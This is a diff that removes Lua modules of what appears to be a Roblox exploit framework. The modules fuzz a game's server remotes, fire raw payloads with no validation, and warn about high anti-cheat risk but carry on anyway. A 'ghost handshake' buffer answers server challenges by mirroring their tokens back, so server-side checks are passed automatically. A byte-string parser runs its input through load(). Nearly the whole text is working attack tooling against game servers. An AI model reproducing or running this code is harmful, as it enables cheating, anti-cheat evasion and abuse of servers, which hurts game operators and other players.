-    if directive and directive.sinkRemote == sinkRemote then
-        -- Use the finalized envelope
-        local envelope = {}
-        for k, v in pairs(directive.envelope) do envelope[k] = v end
-        -- Merge in provided args by position
-        for i, v in ipairs(args or {}) do envelope[i] = v end
-        return true, envelope, nil
-    end
-
-    return false, nil, string.format("Intent '%s' not bound and no directive found", intentName)
-end
-
--- Execute a compiled directive through the active Bedrock pipeline
-function ASE_DirectiveCompiler.Execute(intentName, args)
-    local pair = ASE.Panel.ActiveSink and ASE_BedrockPairs[ASE.Panel.ActiveSink]
-    if not pair or pair.confidence < 0.5 then
-        return false, "No active Bedrock pipeline"
-    end
-
-    if not ASE.Panel.HeartbeatAlive then
-        return false, "Pipeline heartbeat lost — use Recompile"
-    end
-
-    local SBI  = _G.PC.SBI
-    local sinkRemote = pair.sinkRemote
-
-    -- Pre-flight prediction
-    local prediction = SBI and SBI.PredictOutcome(sinkRemote, args)
-    if prediction and prediction.acRisk > 0.7 then
-        warn(string.format("[ASE] High AC risk %.0f%% on %s — proceeding",
-            prediction.acRisk*100, sinkRemote))
-    end
-
-    local ok, result, err = ASE_DirectiveCompiler.Compile(intentName, args, sinkRemote)
-    if not ok then
-        -- In MASTERY mode: auto-decompile and re-route through Forge
-        if ASE_Mode == ASE.MODE.MASTERY then
-            ASE_AppendTx({
-                directive  = intentName,
-                rawPayload = args,
-                result     = "COMPILE FAIL → decompiling to Raw",
-            })
-            return ASE_ForgeEngine.FireRaw(sinkRemote, args, intentName)
-        end
-        return false, err
-    end
-
-    -- Fire through SARP with nonce
-    local nonce   = ASE_GenNonce()
-    local SARP    = _G.PC.SARP
-    local PR      = _G.PC.PR_Registry
-    if not SARP or not PR or not PR[sinkRemote] then
-        return false, "SARP or PR not available"
-    end
-
-    -- Wrap result in Bedrock envelope
-    local bedrockEnv = {
-        __nonce    = nonce,
-        __intent   = intentName,
-        __payload  = type(result) == "table" and result or args,
-        __cargo    = pair.cargo,
-    }
-
-    local wrapped, sim, buildErr = SARP.Build("Attribute", {bedrockEnv}, nil, nil, sinkRemote)
-    if not wrapped then return false, "SARP.Build: " .. tostring(buildErr) end
-
-    local fired = false
-    SARP.Execute(wrapped, sim, sinkRemote, function(success, res, ferr)
-        fired = true
-        ASE_AppendTx({
-            directive  = intentName,
-            rawPayload = bedrockEnv,
-            nonce      = nonce,
-            result     = success and "✓ FIRED" or ("✗ " .. tostring(ferr)),
-        })
-    end)
-
-    return true, nonce
-end
-
--- Finalize: lift a confirmed raw sequence into a Static Directive + register as TSR Intent
-function ASE_DirectiveCompiler.Finalize(goal)
-    local name        = goal.params.name
-    local envelope    = goal.params.envelope
-    local sinkRemote  = goal.params.sinkRemote
-    local category    = goal.params.category or "Custom"
-
-    if not name or not envelope or not sinkRemote then
-        error("Finalize requires name, envelope, sinkRemote")
-    end
-
-    -- Register directive
-    ASE_Directives[name] = {
-        name        = name,
-        category    = category,
-        envelope    = envelope,
-        sinkRemote  = sinkRemote,
-        confirmedAt = os.clock(),
-    }
-
-    -- Attempt to register as TSR Intent
-    local TSR = _G.PC.TSR
-    if TSR and TSR.Registry then
-        pcall(function()
-            local intentDef = {
-                Intent      = name,
-                Category    = category,
-                Type        = "Atomic",
-                Parameters  = goal.params.parameters or {},
-                WatchTargets= goal.params.watchTargets or {},
-                ASEFinalized= true,
-                SinkRemote  = sinkRemote,
-            }
-            TSR.Registry.Intents[name] = intentDef
-            print(string.format("[ASE] ✓ Finalized directive '%s' → TSR Intent registered.", name))
-        end)
-    end
-
-    goal.result = { name=name, sinkRemote=sinkRemote, registeredTSR = TSR ~= nil }
-    ASE_AppendTx({
-        directive  = "FINALIZE: " .. name,
-        rawPayload = envelope,
-        result     = string.format("✓ Lifted to Static Directive [%s]", category),
-    })
-end
-
--- ═════════════════════════════════════════════════════════════
--- MODULE 4 — FORGE ENGINE
--- Raw payload construction, delivery, and discovery fuzzing
--- ═════════════════════════════════════════════════════════════
-ASE_ForgeEngine = {}
-
--- Fire a raw payload directly through SARP with no semantic validation
-function ASE_ForgeEngine.FireRaw(sinkRemote, rawArgs, label)
-    local SARP = _G.PC.SARP
-    local PR   = _G.PC.PR_Registry
-
-    if not SARP or not PR or not PR[sinkRemote] then
-        return false, "SARP/PR not available or remote not known"
-    end
-
-    local prRec = PR[sinkRemote]
-    if not prRec.Remote then
-        return false, "Remote object not available"
-    end
-
-    local nonce = ASE_GenNonce()
-
-    -- For Raw mode: wrap args with nonce but no semantic filtering
-    local wrapped, sim, err = SARP.Build("Attribute", rawArgs, nil, nil, sinkRemote)
-    if not wrapped then
-        -- Fall through to direct fire if SARP can't wrap
-        local ok, ferr = pcall(function()
-            prRec.Remote:FireServer(table.unpack(rawArgs))
-        end)
-        ASE_AppendTx({
-            directive  = label or "RAW FIRE",
-            rawPayload = rawArgs,
-            nonce      = nonce,
-            result     = ok and "✓ DIRECT FIRED" or ("✗ " .. tostring(ferr)),
-        })
-        return ok, ferr
-    end
-
-    local result = nil
-    SARP.Execute(wrapped, sim, sinkRemote, function(success, res, ferr)
-        result = { success=success, res=res, err=ferr }
-        ASE_AppendTx({
-            directive  = label or "RAW FIRE",
-            rawPayload = rawArgs,
-            nonce      = nonce,
-            result     = success and "✓ SARP FIRED" or ("✗ " .. tostring(ferr)),
-        })
-    end)
-
-    return true, nonce
-end
-
--- Discovery: launch an APE campaign and feed results back to ASE
-function ASE_ForgeEngine.Discover(goal)
-    local remoteName = goal.params.remoteName
-
-    -- ── Wait for APE to finish its own boot sequence ──────────────────────────
-    -- APE bootstraps itself asynchronously after its dependencies (SBI, RSM, SR,
-    -- AVD) are ready. DISCOVER goals pushed early by OnAVDFinding arrive before
-    -- APE_Running flips true, causing every StartCampaign to fail with
-    -- "APE not running". We wait up to 60 s before giving up.
-    local APE = nil
-    local waitT0 = os.clock()
-    while os.clock() - waitT0 < 60 do
-        APE = _G.PC.APE
-        if APE and APE.GetStats and APE.GetStats().Running then break end
-        task.wait(1.0)
-    end
-
-    if not APE then error("APE module never registered in _G.PC.APE") end
-    if not APE.GetStats().Running then
-        error("APE not running after 60 s wait — dependencies may have failed to load")
-    end
-
-    if not remoteName then
-        -- No specific remote: trigger a full priority scan
-        local n = APE.Scan()
-        goal.result = { campaignCount=n }
-        return
-    end
-
-    -- ── Attempt to start the campaign ─────────────────────────────────────────
-    local id, err = APE.StartCampaign(remoteName)
-
-    if not id then
-        local errStr = tostring(err)
-
-        if errStr:find("no goals") or errStr:find("no plan") then
-            -- APE is running but hasn't built a probe plan for this remote yet.
-            -- Force a Scan to populate the scorer, then retry once.
-            print(string.format("[ASE DISCOVER] No probe plan for %s — forcing Scan + retry.", remoteName))
-            APE.Scan()
-            task.wait(3)
-            id, err = APE.StartCampaign(remoteName)
-            errStr = tostring(err)
-        end
-
-        if not id then
-            if errStr:find("already active") then
-                -- A campaign for this remote is already in flight.
-                -- Locate it and wait on it rather than erroring.
-                local existing = nil
-                for _, c in ipairs(APE.GetCampaigns()) do
-                    if c.remoteName == remoteName and
-                       (c.status == "RUNNING" or c.status == "ACTIVE") then
-                        existing = c; break
-                    end
-                end
-                if existing then
-                    print(string.format(
-                        "[ASE DISCOVER] Campaign for %s already active (id=%s) — attaching.", remoteName, tostring(existing.id)))
-                    id = existing.id
-                else
-                    goal.result = { status="SKIPPED", reason="already active, not found" }
-                    return
-                end
-            elseif errStr:find("max concurrent") then
-                -- APE is at campaign capacity — back off and retry once
-                print("[ASE DISCOVER] APE at max concurrent campaigns — waiting 10 s.")
-                task.wait(10)
-                id, err = APE.StartCampaign(remoteName)
-                if not id then
-                    error("APE campaign failed after backoff: " .. tostring(err))
-                end
-            else
-                error("APE campaign failed: " .. tostring(err))
-            end
-        end
-    end
-
-    -- Wait for campaign to complete
-    local t0 = os.clock()
-    while os.clock()-t0 < 120 do
-        task.wait(2)
-        local campaigns = APE.GetCampaigns()
-        for _, c in ipairs(campaigns) do
-            if c.id == id then
-                if c.status == "COMPLETE" or c.status == "SATURATED" then
-                    goal.result = { campaignId=id, status=c.status,
-                        confGain=c.confGain, probesFired=c.probesFired }
-                    -- Check if we can now attempt Bedrock
-                    local SBI = _G.PC.SBI
-                    local sbiRec = SBI and SBI.Get(remoteName)
-                    if sbiRec and sbiRec.Confidence >= 0.65
-                       and sbiRec.ACPattern ~= "CORRECTS_FAST" then
-                        goal.result.bedrockCandidate = true
-                        print(string.format("[ASE] DISCOVER → %s is a Bedrock candidate (conf=%.0f%%)",
-                            remoteName, sbiRec.Confidence*100))
-                    end
-                    return
-                end
-            end
-        end
-        if goal.status == ASE.STATUS.ABORTED then return end
-    end
-    goal.result = { campaignId=id, status="TIMEOUT" }
-end
-
--- Convert raw byte-string notation to Lua table
--- Accepts strings like: {[0xAF]="\255\000\127", [1]="value"}
-function ASE_ForgeEngine.ParseByteString(str)
-    local ok, result = pcall(function()
-        local fn = load("return " .. str)
-        if fn then return fn() end
-        return nil
-    end)
-    return ok and result or nil
-end
-
--- Convert Lua table to byte-string display format
-function ASE_ForgeEngine.ToByteString(t, depth)
-    depth = depth or 0
-    if depth > 4 then return "..." end
-    if type(t) ~= "table" then
-        if type(t) == "string" then
-            -- Show hex repr for non-printable
-            local hex = {}
-            for i = 1, #t do
-                local b = t:byte(i)
-                if b < 32 or b > 126 then
-                    table.insert(hex, string.format("\\x%02X", b))
-                else
-                    table.insert(hex, t:sub(i,i))
-                end
-            end
-            return '"' .. table.concat(hex) .. '"'
-        end
-        return tostring(t)
-    end
-    local parts = {}
-    for k, v in pairs(t) do
-        local kStr = type(k) == "number"
-            and string.format("[0x%02X]", k)
-            or string.format("[%q]", tostring(k))
-        table.insert(parts, kStr .. " = " .. ASE_ForgeEngine.ToByteString(v, depth+1))
-    end
-    return "{\n" .. string.rep("  ", depth+1) ..
-           table.concat(parts, ",\n" .. string.rep("  ", depth+1)) ..
-           "\n" .. string.rep("  ", depth) .. "}"
-end
-
-
--- ═════════════════════════════════════════════════════════════
--- MODULE 4B — VERIFY TOPOLOGICAL CIRCUIT
--- Triggered by LINGERED: sends a high-entropy nonce shaped to
--- the remote's RSM arg signature, listens on all S2C remotes
--- for the nonce to return. Only on confirmed return does ASE
--- promote the remote to a full BEDROCK pipeline.
---
---   LINGERED  →  "server held the thread, didn't reject"
---   BEDROCK   →  "server echoed our nonce on a different channel"
--- ═════════════════════════════════════════════════════════════
--- ══════════════════════════════════════════════════════════════════════════════
--- GHOST HANDSHAKE BUFFER
--- Pre-fire infrastructure for closing the Temporal Deadlock.
---
--- The server fires a RemoteEvent:FireClient() challenge immediately after
--- executing the anchor payload. Because the challenge arrives in the window
--- between SARP.Execute and any listener setup, the client misses it and the
--- server thread suspends. This buffer is opened BEFORE SARP fires, so the
--- fast-path responder is already live when the challenge arrives.
---
--- ASE_QueryBuddyRemotes   — CDG + temporal co-occurrence buddy lookup
--- ASE_OpenHandshakeBuffer — pre-fire S2C listeners that capture & respond
--- ══════════════════════════════════════════════════════════════════════════════
-
--- Query CDG and PR for remotes that are causally adjacent to sinkName.
--- Returns a list of {name, confidence, kind} sorted by confidence desc.
--- kind: "CDG_INBOUND", "CDG_OUTBOUND", "TEMPORAL_BUDDY"
-local function ASE_QueryBuddyRemotes(sinkName)
-    local CDG = _G.PC and _G.PC.CDG
-    local PR  = _G.PC.PR_Registry
-    local out = {}
-    local seen = {}
-
-    -- 1. CDG strong edges: both inbound (X->sink) and outbound (sink->X)
-    if CDG then
-        local edges = CDG.GetStrongEdges(0.20)
-        for _, edge in ipairs(edges) do
-            -- Inbound: something fires just before sink — likely the trigger
-            if edge.ToID == sinkName and not seen[edge.FromID] then
-                seen[edge.FromID] = true
-                table.insert(out, {
-                    name       = edge.FromID,
-                    confidence = edge.Confidence,
-                    kind       = "CDG_INBOUND",
-                })
-            end
-            -- Outbound: sink fires just before something — likely the resolver
-            if edge.FromID == sinkName and not seen[edge.ToID] then
-                seen[edge.ToID] = true
-                table.insert(out, {
-                    name       = edge.ToID,
-                    confidence = edge.Confidence,
-                    kind       = "CDG_OUTBOUND",
-                })
-            end
-        end
-    end
-
-    -- 2. PR temporal co-occurrence: remotes that fire within 120ms of sinkName
-    -- PR_Registry stores LastFired timestamps per remote; compare them
-    if PR then
-        local sinkRec = PR[sinkName]
-        local sinkT   = sinkRec and sinkRec.LastFired or 0
-        for name, rec in pairs(PR) do
-            if name ~= sinkName and not seen[name] and rec.LastFired then
-                local gap = math.abs(rec.LastFired - sinkT)
-                if gap <= 0.120 then
-                    seen[name] = true
-                    table.insert(out, {
-                        name       = name,
-                        confidence = math.max(0.20, 1.0 - gap / 0.120),
-                        kind       = "TEMPORAL_BUDDY",
-                    })
-                end
-            end
-        end
-    end
-
-    -- Sort descending by confidence
-    table.sort(out, function(a, b) return a.confidence > b.confidence end)
-    return out
-end
-
--- Open fast-path S2C responders on all buddy remotes BEFORE the anchor fires.
--- Each responder:
---   1. Captures the server's challenge args the moment they arrive
---   2. Mirrors any high-entropy tokens (GUIDs, timestamps, position vectors)
---      back into the Stage 2 resolver payload
---   3. Fires the resolver immediately — no task.wait — in the same Lua
---      resumption cycle so the server's micro-window is satisfied
---
--- Returns a buffer handle: { cleanup(), handshakeCompleted, resolverFired,
---                             capturedArgs, resolverName }
-local function ASE_OpenHandshakeBuffer(sinkName, anchorEnvelope, nonce, buddies)
-    local PR   = _G.PC.PR_Registry
-    local SARP = _G.PC.SARP
-    local conns = {}
-    local done  = false
-
-    local handle = {
-        handshakeCompleted = false,
-        resolverFired      = false,
-        capturedArgs       = nil,
-        resolverName       = nil,
-        cleanup            = function() end,
-    }
-
-    if not PR then return handle end
-
-    -- Parameter mirror: extract high-entropy tokens from server challenge args
-    -- and splice them into a resolver payload alongside the original anchor args
-    local function ASE_MirrorParams(challengeArgs, resolverRec)
-        local RSM = _G.PC.RSM
-        local rsmRec = RSM and RSM.Get(resolverRec.Name or "")
-        local payload = {}
-
-        -- Start from known-good anchor args as baseline
-        for i, v in ipairs(anchorEnvelope) do payload[i] = v end
-
-        -- Walk challenge args: look for GUIDs, timestamps, high-entropy strings
-        -- and splice into matching resolver slots
-        local function isHighEntropy(v)
-            if type(v) == "string" and #v >= 8 then return true end
-            if type(v) == "number" and v > 100000 then return true end  -- timestamp-like
-            return false
-        end
-
-        local function walkChallenge(args, depth)
-            if depth > 4 then return end
-            for _, v in ipairs(args) do
-                if type(v) == "table" then
-                    walkChallenge(v, depth + 1)
-                elseif isHighEntropy(v) then
-                    -- Find first empty or placeholder slot in payload to inject
-                    if rsmRec and rsmRec.ArgSig then
-                        for slot, sig in ipairs(rsmRec.ArgSig) do
-                            if type(v) == type(payload[slot] or v) then
-                                -- Only override if this slot type matches
-                                if not payload[slot] or payload[slot] == 0 or payload[slot] == "" then
-                                    payload[slot] = v
-                                end
-                            end
-                        end
-                    else
-                        -- No RSM — just append the token
-                        table.insert(payload, v)
-                    end
-                end
-            end
-        end
-        walkChallenge(challengeArgs, 0)
-
-        -- Always embed the nonce in a __handshake field so server can match
-        if type(payload[1]) == "table" then
-            payload[1].__handshake = nonce
-            payload[1].__stage     = 2
-        end
-
-        return payload
-    end
-
-    -- Build multimodal listenTargets:
-    --   RE targets  — all S2C/BOTH RemoteEvents (OnClientEvent listeners)
-    --   RF targets  — all RemoteFunctions + buddies (InvokeServer return path)
-    -- These are kept separate so each path gets the right handler.
-    local listenTargets_RE = {}   -- RemoteEvent targets
-    local listenTargets_RF = {}   -- RemoteFunction targets
-
-    -- Seed with CDG buddies first
-    for _, buddy in ipairs(buddies) do
-        local rec = PR[buddy.name]
-        if rec then
-            if rec.RemoteType == "RemoteFunction" then
-                listenTargets_RF[buddy.name] = true
-            else
-                listenTargets_RE[buddy.name] = true
-            end
-        end
-    end
-
-    -- Wide net: all S2C/BOTH RemoteEvents
-    for name, rec in pairs(PR) do
-        if rec.RemoteType == "RemoteEvent" and
-           (rec.Direction == "S2C" or rec.Direction == "BOTH") then
-            listenTargets_RE[name] = true
-        end
-    end
-
-    -- Wide net: ALL RemoteFunctions — their return value is the challenge
-    -- The sink itself is included here; InvokeServer on the sink returns
-    -- the server's response inline — no separate FireClient.
-    for name, rec in pairs(PR) do
-        if rec.RemoteType == "RemoteFunction" then
-            listenTargets_RF[name] = true
-        end
-    end
-
-    -- Unified view for the OnClientEvent loop below
-    local listenTargets = listenTargets_RE
-
-    for rname, _ in pairs(listenTargets) do
-        local rec = PR[rname]
-        if rec and rec.Remote then
-            local ok, conn = pcall(function()
-                return rec.Remote.OnClientEvent:Connect(function(...)
-                    if done then return end
-                    local challengeArgs = {...}
-
-                    -- Check if this looks like a challenge aimed at our anchor
-                    -- Heuristic: contains nonce, OR arrived within 1.5s of buffer open
-                    local isChallenge = false
-                    local function scanForNonce(v, depth)
-                        if depth > 4 then return end
-                        if type(v) == "string" and v:find(nonce, 1, true) then
-                            isChallenge = true; return
-                        end
-                        if type(v) == "table" then
-                            for _, child in pairs(v) do
-                                scanForNonce(child, depth + 1)
-                                if isChallenge then return end
-                            end
-                        end
-                    end
-                    scanForNonce(challengeArgs, 0)
-
-                    -- Also treat any S2C fire from a buddy remote as a potential
-                    -- challenge — even without nonce, timing correlation is enough
-                    if not isChallenge then
-                        for _, buddy in ipairs(buddies) do
-                            if buddy.name == rname and buddy.confidence >= 0.40 then
-                                isChallenge = true
-                                break
-                            end
-                        end
-                    end
-
-                    if isChallenge then
-                        done = true
-                        handle.capturedArgs = challengeArgs
-                        handle.resolverName = rname
-
-                        -- ── FAST-PATH RESPONSE ─────────────────────────────
-                        -- Build Stage 2 resolver payload and fire immediately.
-                        -- This runs in the same Lua resumption — no yield.
-                        local resolverRec = PR[rname]
-                        if resolverRec and resolverRec.Remote and SARP then
-                            local stage2Payload = ASE_MirrorParams(challengeArgs, {Name=rname})
-                            local wrapped2, sim2 = pcall(function()
-                                return SARP.Build("Attribute", stage2Payload, nil, nil, rname)
-                            end)
-                            if wrapped2 and sim2 then
-                                -- Fire without waiting — same scheduler frame
-                                pcall(SARP.Execute, sim2, nil, rname, function(ok2)
-                                    handle.resolverFired      = ok2
-                                    handle.handshakeCompleted = ok2
-                                end)
-                            else
-                                -- SARP.Build returned (ok, wrapped, sim) — pcall wrapping issue
-                                -- Fallback: direct FireServer with mirrored payload
-                                pcall(function()
-                                    resolverRec.Remote:FireServer(table.unpack(stage2Payload))
-                                end)
-                                handle.resolverFired      = true
-                                handle.handshakeCompleted = true
-                            end
-
-                            print(string.format(
-                                "[ASE VERIFY] Ghost handshake caught on %s — Stage 2 fired immediately.",
-                                rname))
-                        end
-                    end
-                end)
-            end)
-            if ok and conn then table.insert(conns, conn) end
-        end
-    end
-
-    -- ── RemoteFunction invoke path ────────────────────────────────────────────
-    -- Iterates over listenTargets_RF — every RF in the registry, including the
-    -- sink itself. For a RF, InvokeServer IS the handshake: the return value is
-    -- the server's challenge. No separate FireClient is ever sent.
-    -- Each invoke runs in its own task.spawn so they race in parallel.
-    -- First one to capture a non-nil return wins; others drop out via done guard.
-    local RFInvokeTimeout = 3.0
-    for rname, _ in pairs(listenTargets_RF) do
-        local rec = PR[rname]
-        if rec and rec.Remote and rec.RemoteType == "RemoteFunction" then
-            task.spawn(function()
-                if done then return end
-                -- Build the invoke payload: use anchor envelope as baseline
-                -- (the RF likely expects the same arg shape as the sink)
-                local invokePayload = {}
-                for i, v in ipairs(anchorEnvelope) do invokePayload[i] = v end
-
-                -- Fire InvokeServer — return value IS the server's challenge
-                local invokeOk, returnVal = pcall(function()
-                    return rec.Remote:InvokeServer(table.unpack(invokePayload))
-                end)
-
-                if done then return end  -- another path already resolved
-
-                if invokeOk and returnVal ~= nil then
-                    -- Normalize return into an args table
-                    local challengeArgs = type(returnVal) == "table"
-                        and returnVal or { returnVal }
-
-                    done = true
-                    handle.capturedArgs = challengeArgs
-                    handle.resolverName = rname
-
-                    -- Build Stage 2 payload with mirrored tokens
-                    local stage2Payload = ASE_MirrorParams(challengeArgs, {Name = rname})
-
-                    -- Fire Stage 2 resolver — same task, no additional yield
-                    local resolverRec = PR[rname]
-                    if resolverRec and resolverRec.Remote then
-                        if resolverRec.RemoteType == "RemoteFunction" then
-                            -- RF resolver: InvokeServer with stage 2 payload
-                            local s2ok = pcall(function()
-                                resolverRec.Remote:InvokeServer(table.unpack(stage2Payload))
-                            end)
-                            handle.resolverFired      = s2ok
-                            handle.handshakeCompleted = s2ok
-                        else
-                            -- RE resolver: FireServer with stage 2 payload
-                            pcall(function()
-                                resolverRec.Remote:FireServer(table.unpack(stage2Payload))
-                            end)
-                            handle.resolverFired      = true
-                            handle.handshakeCompleted = true
-                        end
-                    end
-
-                    print(string.format(
-                        "[ASE VERIFY] RF invoke path: challenge captured on %s — Stage 2 fired.",
-                        rname))
-                end
-            end)
-        end
-    end
-
-    handle.cleanup = function()
-        done = true
-        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
-    end
-
-    return handle
-end
-
-ASE_VerifyCircuit = {}
-
-function ASE_VerifyCircuit.Run(goal)
-    local remoteName = goal.params.remoteName
-    local PR         = _G.PC.PR_Registry
-    local RSM        = _G.PC.RSM
-    local SARP       = _G.PC.SARP
-    local SBI        = _G.PC.SBI
-
-    if not remoteName then error("VERIFY requires remoteName") end
-    if not PR or not PR[remoteName] then
-        error("Remote not in PR registry: " .. tostring(remoteName))
-    end
-
-    print(string.format("[ASE VERIFY] Beginning topological circuit check on %s", remoteName))
-
-    -- ── STEP 1: Build nonce + shaped anchor envelope ───────────────────────
-    local nonce    = ASE_GenNonce()
-    local rsmRec   = RSM and RSM.Get(remoteName)
-    local envelope = {}
-
-    if rsmRec and rsmRec.ArgSig and #rsmRec.ArgSig > 0 then
-        local embedded = false
-        for i, argSig in ipairs(rsmRec.ArgSig) do
-            if argSig.DominantType == "table" then
-                envelope[i] = { __nonce = nonce, __verify = true }
-                embedded = true
-            elseif argSig.DominantType == "number" and #(argSig.SuccessValues or {}) > 0 then
-                envelope[i] = argSig.SuccessValues[1]
-            elseif argSig.DominantType == "string" then
-                if not embedded and i == 1 then
-                    envelope[i] = nonce
-                    embedded = true
-                elseif #(argSig.SuccessStrings or {}) > 0 then
-                    envelope[i] = argSig.SuccessStrings[1]
-                end
-            end
-        end
-        if not embedded then
-            envelope = { __nonce = nonce, __verify = true }
-        end
-    else
-        envelope = { __nonce = nonce, __verify = true }
-    end
-
-    goal.result = { nonce=nonce, remoteName=remoteName }
-
-    -- ── STEP 2: Query buddy remotes for Handshake Buffer ──────────────────
-    -- Done before any wire activity so buffer is primed when server challenge
-    -- arrives in the micro-window immediately after the anchor fires.
-    local buddies = ASE_QueryBuddyRemotes(remoteName)
-    if #buddies > 0 then
-        local bnames = {}
-        for _, b in ipairs(buddies) do
-            table.insert(bnames, string.format("%s(%s,%.2f)", b.name, b.kind, b.confidence))
-        end
-        print(string.format("[ASE VERIFY] Handshake buffer arming — %d buddy(s): %s",
-            #buddies, table.concat(bnames, ", ")))
-    else
-        print("[ASE VERIFY] No CDG buddies — buffer will cast wide net on all S2C remotes.")
-    end
-
-    -- ── STEP 3: Open Handshake Buffer BEFORE SARP fires ───────────────────
-    -- This is the critical inversion. The buffer is live when the server sends
-    -- its challenge, so the fast-path responder can reply in the same frame.
-    local buffer = ASE_OpenHandshakeBuffer(remoteName, envelope, nonce, buddies)
-
-    -- ── STEP 4: Open passive nonce echo listener (fallback path) ──────────
-    -- If the server does push a nonce outward on a different channel (original
-    -- VERIFY model), this catches it as before.
-    local captured       = false
-    local feedbackRemote = nil
-
-    local listener = ASE_OpenNonceListener(nonce, function(rname, args)
-        captured       = true
-        feedbackRemote = rname
-    end)
-
-    ASE_AppendTx({
-        directive  = string.format("VERIFY CIRCUIT: %s", remoteName),
-        rawPayload = envelope,
-        nonce      = nonce,
-        result     = string.format("Buffer armed (%d buddies) — firing anchor...", #buddies),
-    })
-
-    -- ── STEP 5: Fire anchor via SARP ──────────────────────────────────────
-    local wrapped, sim, buildErr = SARP and SARP.Build("Attribute", envelope, nil, nil, remoteName)
-    if not wrapped then
-        buffer.cleanup()
-        if listener then listener.cleanup() end
-        ASE_LingerPending[remoteName] = nil
-        error("VERIFY SARP.Build failed: " .. tostring(buildErr))
-    end
-
-    SARP.Execute(wrapped, sim, remoteName, function(success, result, err)
-        goal.result.sarpSuccess = success
-    end)
-
-    -- ── STEP 6: Wait for confirmation ─────────────────────────────────────
-    -- Three resolution paths (checked in priority order):
-    --   A. Ghost handshake completed — buffer caught challenge + fired Stage 2
-    --   B. Nonce echo received — server pushed nonce on outbound channel
-    --   C. Timeout — neither path resolved within NonceListenTimeout
-    local t0 = os.clock()
-    while not buffer.handshakeCompleted and not captured
-          and (os.clock() - t0) < ASE_CFG.NonceListenTimeout do
-        task.wait(0.10)
-        if goal.status == ASE.STATUS.ABORTED then
-            buffer.cleanup()
-            if listener then listener.cleanup() end
-            ASE_LingerPending[remoteName] = nil
-            return
-        end
-    end
-
-    buffer.cleanup()
-    if listener then listener.cleanup() end
-    ASE_LingerPending[remoteName] = nil
-
-    -- Determine confirmation source
-    local confirmed    = false
-    local resolvedVia  = nil
-    local resolverName = nil
-
-    if buffer.handshakeCompleted then
-        -- Path A: Ghost handshake — two-stage execution chain closed
-        confirmed    = true
-        resolvedVia  = "GHOST_HANDSHAKE"
-        resolverName = buffer.resolverName
-        feedbackRemote = resolverName
-        print(string.format(
-            "[ASE VERIFY] GHOST HANDSHAKE CLOSED: %s stage-2 via %s",
-            remoteName, tostring(resolverName)))
-    elseif captured then
-        -- Path B: Classic nonce echo
-        confirmed   = true
-        resolvedVia = "NONCE_ECHO"
-        print(string.format(
-            "[ASE VERIFY] NONCE ECHO CONFIRMED: %s feedback via %s",
-            remoteName, tostring(feedbackRemote)))
-    end
-
-    if confirmed then
-        -- ── CIRCUIT CONFIRMED ─────────────────────────────────────────────
-        local origin = resolvedVia == "GHOST_HANDSHAKE"
-            and "LINGER_GHOST_HANDSHAKE"
-            or  "LINGER_VERIFY"
-
-        ASE_BedrockPairs[remoteName] = {
-            sinkRemote     = remoteName,
-            feedbackRemote = feedbackRemote,
-            nonce          = nonce,
-            confirmedAt    = os.clock(),
-            cargo          = {},
-            confidence     = 1.0,
-            origin         = origin,
-            resolvedVia    = resolvedVia,
-            capturedArgs   = buffer.capturedArgs,
-        }
-
-        ASE.Panel.Visible        = true
-        ASE.Panel.ActiveSink     = remoteName
-        ASE.Panel.ActiveFeedback = feedbackRemote
-        ASE.Panel.BedrockConf    = 1.0
-        ASE.Panel.HeartbeatAlive = true
-
-        local CSK = _G.PC.CSK
-        if CSK then
-            CSK.Annotate(remoteName, string.format(
-                "BEDROCK via %s: %s (nonce=%s)",
-                origin, tostring(feedbackRemote), nonce:sub(1,8)))
-        end
-
-        goal.result.confirmed      = true
-        goal.result.feedbackRemote = feedbackRemote
-        goal.result.resolvedVia    = resolvedVia
-
-        ASE_AppendTx({
-            directive  = "CIRCUIT CONFIRMED",
-            rawPayload = {sink=remoteName, feedback=feedbackRemote, via=resolvedVia},
-            nonce      = nonce,
-            result     = string.format("BEDROCK [%s] — Panel active", resolvedVia),
-        })
-
-        ASE_BedrockHandshake.StartHeartbeat(remoteName)
-    else
-        -- ── NO CIRCUIT RESOLVED ───────────────────────────────────────────
-        -- Log whether buffer caught anything (ghost challenge seen but Stage 2 failed)
-        local bufferNote = buffer.capturedArgs
-            and string.format(" (ghost challenge caught on %s — Stage 2 did not complete)",
-                tostring(buffer.resolverName))
-            or  " (no challenge captured)"
-
-        print(string.format(
-            "[ASE VERIFY] %s lingered but circuit did not close%s",
-            remoteName, bufferNote))
-
-        goal.result.confirmed     = false
-        goal.result.bufferCaptured = buffer.capturedArgs ~= nil
-
-        ASE_AppendTx({
-            directive  = string.format("VERIFY FAILED: %s", remoteName),
-            rawPayload = { bufferCaught = buffer.capturedArgs ~= nil },
-            nonce      = nonce,
-            result     = "LINGERED — circuit open" .. bufferNote,
-        })
-
-        -- Ghost handshake and nonce echo both failed.
-        -- Escalate to Property Steering: check LingerWatch for unusual deltas
-        -- on the four client-writable surfaces and attempt to satisfy the
-        -- server's in-process dependency directly.
-        local unusualDeltas = ASE_LingerWatch.GetUnusualDeltas(remoteName)
-        if #unusualDeltas > 0 then
-            print(string.format(
-                "[ASE VERIFY] %d unusual delta(s) detected — escalating to Property Steering.",
-                #unusualDeltas))
-            ASE_PropertySteerer.Try(remoteName, function(resolvedDelta)
-                -- Property steering resolved — lock as Bedrock with STATE_GATE origin
-                ASE_BedrockPairs[remoteName] = {
-                    sinkRemote     = remoteName,
-                    feedbackRemote = nil,
-                    nonce          = nonce,
-                    confirmedAt    = os.clock(),
-                    cargo          = {},
-                    confidence     = 0.90,
-                    origin         = "STATE_GATE",
-                    resolvedDelta  = resolvedDelta,
-                }
-                ASE.Panel.Visible        = true
-                ASE.Panel.ActiveSink     = remoteName
-                ASE.Panel.ActiveFeedback = nil
-                ASE.Panel.BedrockConf    = 0.90
-                ASE.Panel.HeartbeatAlive = true
-                local CSK = _G.PC.CSK
-                if CSK then
-                    CSK.Annotate(remoteName, string.format(
-                        "BEDROCK via STATE_GATE: dependency=%s", resolvedDelta.key))
-                end
-            end)
-        else
-            -- No replication deltas found — pivot to State-Nudge.
-            -- The dependency is physical rather than data-driven.
-            print(string.format(
-                "[ASE VERIFY] No unusual deltas on %s — pivoting to State-Nudge.",
-                remoteName))
-            ASE_StateNudge.Try(remoteName)
-        end
-    end
-end
-
--- ═════════════════════════════════════════════════════════════
--- MODULE 5 — RECOMPILE ENGINE
--- Drift detection → autonomous decompile → re-fuzz → re-bind
--- ═════════════════════════════════════════════════════════════
-ASE_RecompileEngine = {}
-
-function ASE_RecompileEngine.Run(goal)
-    local sinkRemote     = goal.params.sinkRemote
